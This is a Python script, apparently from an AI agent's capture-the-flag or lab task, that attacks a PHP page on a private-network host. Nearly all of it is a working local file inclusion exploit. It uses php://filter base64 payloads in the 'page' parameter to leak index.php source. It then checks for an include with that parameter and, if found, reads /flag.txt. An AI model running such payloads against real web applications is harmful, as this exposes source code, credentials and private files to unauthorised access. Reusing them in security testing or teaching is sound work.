import base64
import json
import re
import urllib.parse

import framework_evidence

BASE = "http://192.168.2.0/index.php"
TIMEOUT = "25"


def run_request(label, page_value):
    url = BASE + "?" + urllib.parse.urlencode({"page": page_value})
    envelope = framework_evidence.run_tool([
        "curl", "-sS", "-i", "--max-time", TIMEOUT, "--max-redirs", "0", url
    ])
    return {"label": label, "requested_url": url, "envelope": envelope}


def find_stdout(value):
    if isinstance(value, dict):
        if isinstance(value.get("stdout"), str):
            return value["stdout"]
        for child in value.values():
            found = find_stdout(child)
            if found is not None:
                return found
    elif isinstance(value, list):
        for child in value:
            found = find_stdout(child)
            if found is not None:
                return found
    return None


def response_body(raw):
    if raw is None:
        return None
    parts = re.split(r"\r?\n\r?\n", raw, maxsplit=1)
    return parts[1] if len(parts) == 2 else ""


def decoded_candidates(body):
    if not body:
        return []
    found = []
    # Filter output may be surrounded by the application's HTML shell.
    for token in re.findall(r"[A-Za-z0-9+/]{32,}={0,2}", body):
        try:
            decoded = base64.b64decode(token, validate=True)
            text = decoded.decode("utf-8", errors="replace")
        except (ValueError, UnicodeError):
            continue
        found.append({"encoded_length": len(token), "decoded_text": text})
    return found


results = []
source_probe = run_request(
    "php_filter_source_index",
    "php://filter/convert.base64-encode/resource=index.php",
)
results.append(source_probe)
source_raw = find_stdout(source_probe["envelope"])
source_body = response_body(source_raw)
source_decoded = decoded_candidates(source_body)
php_sources = [item for item in source_decoded if "<?php" in item["decoded_text"]]

analysis = {
    "source_response_stdout_found": source_raw is not None,
    "source_php_candidates": php_sources,
    "source_parse_note": "Candidates are heuristic base64 decodes from the response body; raw headers and body remain in the tool envelope.",
}

# Follow the source evidence only if it shows a dynamic page parameter used
# with PHP inclusion. This is a direct test of the target's specified root path.
source_text = "\n".join(item["decoded_text"] for item in php_sources)
uses_page_parameter = bool(re.search(r"\$_(GET|REQUEST|POST)\s*\[.{0,40}page", source_text, re.I))
uses_include = bool(re.search(r"\b(include|include_once|require|require_once)\b", source_text, re.I))
analysis["source_indicates_page_parameter"] = uses_page_parameter
analysis["source_indicates_include_or_require"] = uses_include

if php_sources and uses_page_parameter and uses_include:
    flag_probe = run_request(
        "php_filter_target_root_flag",
        "php://filter/convert.base64-encode/resource=/flag.txt",
    )
    results.append(flag_probe)
    flag_raw = find_stdout(flag_probe["envelope"])
    flag_body = response_body(flag_raw)
    analysis["flag_response_stdout_found"] = flag_raw is not None
    analysis["flag_decoded_candidates"] = decoded_candidates(flag_body)
else:
    analysis["flag_followup"] = (
        "Not issued: the observed response did not yield PHP source showing both a page parameter and include/require behavior."
    )

print(json.dumps({"evidence_version": 1, "requests": results, "analysis": analysis}, ensure_ascii=False))

